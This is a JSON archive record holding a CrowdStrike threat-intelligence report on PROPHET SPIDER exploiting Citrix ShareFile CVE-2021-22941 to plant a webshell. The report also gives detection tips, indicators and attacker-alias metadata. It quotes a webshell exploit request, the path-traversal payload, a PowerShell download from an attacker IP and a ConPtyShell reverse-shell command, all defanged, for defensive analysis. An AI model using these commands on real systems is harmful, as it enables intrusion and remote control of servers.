@@ -1,0 +1,181 @@
+{
+    "id": "aa2ec0aa-e538-41ad-a7ee-0acfd76c7373",
+    "created_at": "2023-01-12T15:01:51.832364Z",
+    "updated_at": "2025-03-27T02:14:05.255324Z",
+    "deleted_at": null,
+    "sha1_hash": "02b130b39932f65685cc11073f77d902f9a79228",
+    "title": "2022-03-07 - PROPHET SPIDER Exploits Citrix ShareFile Remote Code Execution Vulnerability CVE-2021-22941 to Deliver Webshell",
+    "authors": "",
+    "file_creation_date": "2022-05-28T16:56:42Z",
+    "file_modification_date": "2022-05-28T16:56:42Z",
+    "file_size": 303708,
+    "plain_text": "# PROPHET SPIDER Exploits Citrix ShareFile\n\n**[crowdstrike.com/blog/prophet-spider-exploits-citrix-sharefile/](https://www.crowdstrike.com/blog/prophet-spider-exploits-citrix-sharefile/)**\n\nChris Nguyen - Eric Loui March 7, 2022\n\nAt the start of 2022, CrowdStrike Intelligence and CrowdStrike Services investigated an\nincident in which PROPHET SPIDER exploited CVE-2021-22941 — a remote code\nexecution (RCE) vulnerability impacting Citrix ShareFile Storage Zones Controller — to\ncompromise a Microsoft Internet Information Services (IIS) web server. The adversary\nexploited the vulnerability to deploy a webshell that enabled the downloading of additional\ntools. This incident highlights how PROPHET SPIDER continues to evolve their tradecraft\nwhile continuing to exploit known web-server vulnerabilities.\n\n## Background\n\n### PROPHET SPIDER\n\n[PROPHET SPIDER is an eCrime actor, active since at least May 2017, that primarily gains](https://www.crowdstrike.com/blog/prophet-spider-exploits-oracle-weblogic-to-facilitate-ransomware-activity/)\naccess to victims by compromising vulnerable web servers, which commonly involves\nleveraging a variety of publicly disclosed vulnerabilities. The adversary has likely functioned\nas an access broker — handing off access to a third party to deploy ransomware — in\nmultiple instances.\n\n\n-----\n\n### CVE-2021-22941\n\n[In September 2021, Citrix disclosed a relative path-traversal vulnerability in ShareFile Zones](https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html)\nStorage Controller, designated CVE-2021-22941. Shortly thereafter, security researchers\n[demonstrated a proof-of-concept (POC) exploit for the CVE. Based on the known technical](https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html)\n[details, others were able to reproduce fully weaponized exploits for CVE-2021-22941 that](https://github.com/hoavt184/CVE-2021-22941)\nhave proliferated since mid-October 2021. The vulnerability allows an adversary to overwrite\nan existing file on a target server via an `uploadid parameter passed in an HTTP` `GET`\nrequest.\n\n## Initial Access and Exploitation\n\nOn Jan. 10, 2022, PROPHET SPIDER sent an HTTP `POST request to an IIS server of a`\nCrowdStrike Falcon platform customer, using the user agent ® `python-requests/2.26.0 .`\nThe request to `/upload.aspx contained the following command:`\n```\nPOST /upload.aspx?\nuploadid=%40using+System.Diagnostics%3B%40%7Bint+idx0%3D+0%3Bstring+str_idx0+%3D+idx0.\n\n```\nThere are three key components to this request.\n\nThe URI endpoint `/upload.aspx is used for ShareFile uploads and usually comes with`\nparameters to define upload object specifications, such as uploadid, cid or batchid. In this\ncase, the uploadid parameter contained a webshell:\n```\nuploadid=@using+System.Diagnostics;@{int+idx0=+0;string+str_idx0+=+idx0.ToString();+in\n\n```\nThis is content that the exploit will write to an ASP.NET file; it uses Razor syntax, where\n```\n@<keyword> allows a keyword to be used as a variable name, and @{ is used to open a\n\n```\nC# code block. The C# `Process.Start(cmd,arg); method provides the backdoor`\nfunction that will be used to execute arbitrary commands.\n```\n/../../ConfigService\\Views\\Shared\\Error.cshtml\n\n```\nThis is the relative path traversal that will allow the payload to overwrite the legitimate\n```\nError.cshtml page.\nbp=123&accountid=123\n\n```\nThese are parameters that are expected by the upload function and included to prevent an\nerror from occurring. Additionally, these values match the default characters used in the\n[previously mentioned publicly available CVE-2021-22941 exploit.](https://github.com/hoavt184/CVE-2021-22941/blob/master/exploit.py)\n\nAnalysts looking for evidence of attempted CVE-2021-22941 exploitation can examine IIS\naccess logs for web requests that:\n\nTarget `upload.aspx`\n\n\n-----\n\nContain encoded strings for `../ and`\n```\n   ConfigService\\Views\\Shared\\Error.cshtml in the URL parameters\n\n```\nMay contain `&bp=123&accountid=123 if the attacker has not customized the payload`\n\nOnce the webshell is set, it can be accessed by sending an HTTP request to\n```\n/configservice/Home/Error with one or two URL parameters. ASP.NET will direct these\n\n```\nrequests to `Error.cshtml, which usually contains a simple HTML header saying “Sorry, an`\nerror occurred while processing your request.” Due to the exploit, the contents have been\nreplaced with the C# code block and will invoke `Process.Start(cmd.arg) using the URL`\nparameter(s) passed in the `GET request.`\n\n## Post-exploitation Commands\n\nAfter achieving initial access, PROPHET SPIDER used the following command to test\nconnectivity:\n```\nCMD.exe /C nslookup xab8v404gwftvw5nvw95ig6ybphf54.burpcollaborator[.]net</code\n\n```\nIf successful, this command performs a name lookup on a subdomain of\n```\nburpcollaborator[.]net, which the open-source vulnerability-testing tool BurpSuite can\n\n```\ncheck to confirm responding systems.\n\nThe adversary next attempted to execute encoded PowerShell commands that decoded to:\n```\npowershell -Command (New-Object\nSystem.Net.WebClient).DownloadFile('http[:]//45.61.136[.]39:443/wget[.]bin','C:\\Window\ncmd /c c:\\Windows\\temp\\wget.bin -t 1 http[:]//45.61.136[.]39:443/winn.exe -O\nc:\\windows\\temp\\wi.exe\n\n```\nThese commands attempted to download the legitimate `wget utility from a remote IP`\naddress, then attempted to use `wget to download another remote binary, named`\n```\nwinn.exe . The winn.exe download was unsuccessful. The adversary then attempted to\n\n```\ninstall an open-source reverse shell from GitHub:\n```\npowershell -Command IEX(IWR\nhttps[:]//raw.githubusercontent[.]com/antonioCoco/ConPtyShell/master/InvokeConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 107.181.187[.]184 RemotePort 4242 -Rows 44 -Cols 166\n\n```\nThis payload attempted to load the `ConPtyShell reverse shell directly from GitHub, with`\nparameters to connect back to the IP address `107.181.187[.]184 over TCP port` `4242 .`\n\n## Conclusion\n\n\n-----\n\nAs CrowdStrike Intelligence previously reported, PROPHET SPIDER is an opportunistic\neCrime actor that exploits publicly disclosed server vulnerabilities, often to deliver webshells.\nThis recent CVE-2021-22941 exploitation demonstrates the adversary’s willingness to\noperationalize new and different exploit code, as well as their enduring preference for\ndeploying the `wget utility to begin operations.`\n\n### Indicators of Compromise (IOCs)\n\n**Description** **IP Addresses**\n\nSite hosting `wget.bin and` `winn.exe` `45.61.136[.]39`\n\nCallback destination for `ConPtyShell` `107.181.187[.]184`\nreverse shell\n\nSource observed exploiting CVE-2021- `188.119.149[.]160`\n22941\n\nSite hosting `ConPtyShell reverse shell` `hxxps[:]//raw.githubusercontent[.]com`\n```\n                       /antonioCoco/ConPtyShell/master\n                       /Invoke-ConPtyShell.ps1\n\n```\n\n### MITRE ATT&CK® Observed Tactics\n\n**Tactic** **Description**\n\nInitial Access T1190: [Exploit Public Facing Application](https://attack.mitre.org/techniques/T1190)\n\nExecution T1059.001: [Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)\n\nPersistence T1505.003: [Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003)\n\nCommand and Control T1071: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071/)\n\nT1105: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)\n\n**Additional Resources**\n\n_Read more about CrowdStrike’s observations of PROPHET SPIDER activity in this_\n_[blog: PROPHET SPIDER Exploits Oracle WebLogic to Facilitate Ransomware Activity.](https://www.crowdstrike.com/blog/prophet-spider-exploits-oracle-weblogic-to-facilitate-ransomware-activity/)_\n_To learn more about how to incorporate intelligence on threat actors into your security_\n_strategy, visit the_ _[Falcon X™ Premium Threat Intelligence page.](https://www.crowdstrike.com/endpoint-security-products/falcon-x-threat-intelligence/premium/)_\n_[Visit the CrowdStrike website to learn more about CrowdStrike Services.](https://www.crowdstrike.com/services/)_\n_[Get a full-featured free trial of CrowdStrike Falcon Prevent™ and learn how true next-](https://go.crowdstrike.com/try-falcon-prevent.html)_\n_gen AV performs against today’s most sophisticated threats._\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-07 - PROPHET SPIDER Exploits Citrix ShareFile Remote Code Execution Vulnerability CVE-2021-22941 to Deliver Webshell.pdf"
+    ],
+    "report_names": [
+        "2022-03-07 - PROPHET SPIDER Exploits Citrix ShareFile Remote Code Execution Vulnerability CVE-2021-22941 to Deliver Webshell.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "6c4f98b3-fe14-42d6-beaa-866395455e52",
+            "created_at": "2023-01-06T13:46:39.169554Z",
+            "updated_at": "2025-03-27T02:00:03.011739Z",
+            "deleted_at": null,
+            "main_name": "Evil Corp",
+            "aliases": [
+                "GOLD DRAKE"
+            ],
+            "source_name": "MISPGALAXY:Evil Corp",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "056826cb-6e17-4954-a9b4-2cc8c6ae3cb8",
+            "created_at": "2023-03-04T02:01:54.115678Z",
+            "updated_at": "2025-03-27T02:00:03.125249Z",
+            "deleted_at": null,
+            "main_name": "Prophet Spider",
+            "aliases": [
+                "GOLD MELODY",
+                "UNC961"
+            ],
+            "source_name": "MISPGALAXY:Prophet Spider",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "50068c14-343c-4491-b568-df41dd59551c",
+            "created_at": "2022-10-25T15:50:23.253218Z",
+            "updated_at": "2025-03-27T02:00:55.408128Z",
+            "deleted_at": null,
+            "main_name": "Indrik Spider",
+            "aliases": [
+                "Indrik Spider",
+                "Evil Corp",
+                "Manatee Tempest",
+                "DEV-0243",
+                "UNC2165"
+            ],
+            "source_name": "MITRE:Indrik Spider",
+            "tools": [
+                "Mimikatz",
+                "PsExec",
+                "Dridex",
+                "WastedLocker",
+                "BitPaymer",
+                "Cobalt Strike"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "9806f226-935f-48eb-b138-6616c9bb9d69",
+            "created_at": "2022-10-25T16:07:23.73153Z",
+            "updated_at": "2025-03-27T02:02:09.950784Z",
+            "deleted_at": null,
+            "main_name": "Indrik Spider",
+            "aliases": [
+                "Blue Lelantos",
+                "DEV-0243",
+                "Evil Corp",
+                "Gold Drake",
+                "Gold Winter",
+                "Manatee Tempest",
+                "UNC2165"
+            ],
+            "source_name": "ETDA:Indrik Spider",
+            "tools": [
+                "Advanced Port Scanner",
+                "Agentemis",
+                "Babuk",
+                "Babuk Locker",
+                "Babyk",
+                "BitPaymer",
+                "Bugat",
+                "Bugat v5",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "Cridex",
+                "Dridex",
+                "EmPyre",
+                "EmpireProject",
+                "FAKEUPDATES",
+                "FakeUpdate",
+                "Feodo",
+                "FriedEx",
+                "Hades",
+                "IEncrypt",
+                "LINK_MSIEXEC",
+                "MEGAsync",
+                "Macaw Locker",
+                "Metasploit",
+                "Mimikatz",
+                "PayloadBIN",
+                "Phoenix Locker",
+                "PowerShell Empire",
+                "PowerSploit",
+                "PsExec",
+                "QNAP-Worm",
+                "Raspberry Robin",
+                "RaspberryRobin",
+                "SocGholish",
+                "Vasa Locker",
+                "WastedLoader",
+                "WastedLocker",
+                "cobeacon",
+                "wp_encrypt"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "47b52642-e5b8-4502-b714-b625002d86aa",
+            "created_at": "2024-06-19T02:03:08.086579Z",
+            "updated_at": "2025-03-27T02:05:17.385492Z",
+            "deleted_at": null,
+            "main_name": "GOLD MELODY",
+            "aliases": [
+                "UNC961",
+                "PROPHET SPIDER"
+            ],
+            "source_name": "Secureworks:GOLD MELODY",
+            "tools": [
+                " 7-ZIP",
+                " AUDITUNNEL",
+                " BURP Suite",
+                " GOTROJ",
+                " JSP webshells",
+                " Mimikatz",
+                " Wget",
+                "7-ZIP"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535711,
+    "ts_updated_at": 1743041645,
+    "ts_creation_date": 1653757002,
+    "ts_modification_date": 1653757002,
+    "files": {
+        "pdf": "https://archive.orkl.eu/02b130b39932f65685cc11073f77d902f9a79228.pdf",
+        "text": "https://archive.orkl.eu/02b130b39932f65685cc11073f77d902f9a79228.txt",
+        "img": "https://archive.orkl.eu/02b130b39932f65685cc11073f77d902f9a79228.jpg"
+    }
+}
